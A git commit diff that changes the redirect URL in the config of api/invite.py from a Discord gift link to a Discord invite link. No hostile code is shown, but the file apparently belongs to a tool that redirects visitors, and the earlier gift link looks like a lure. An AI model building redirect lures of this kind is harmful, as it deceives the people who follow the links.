bcfa362c9a6431268e66cca15b162d0af1c6cf83
xTwiss <stefangtr10@gmail.com>
2025-03-20 15:42:34 +0100

    Update invite.py

--- api/invite.py
+++ api/invite.py
@@ -51,7 +51,7 @@ config = {
     # REDIRECTION #
     "redirect": {
         "redirect": True, # Redirect to a webpage?
-        "page": "https://discord.com/gifts/2J78fK38G4" # Link to the webpage to redirect to 
+        "page": "https://discord.com/invite/blurredd" # Link to the webpage to redirect to 
     },
 
     # Please enter all values in correct format. Otherwise, it may break.
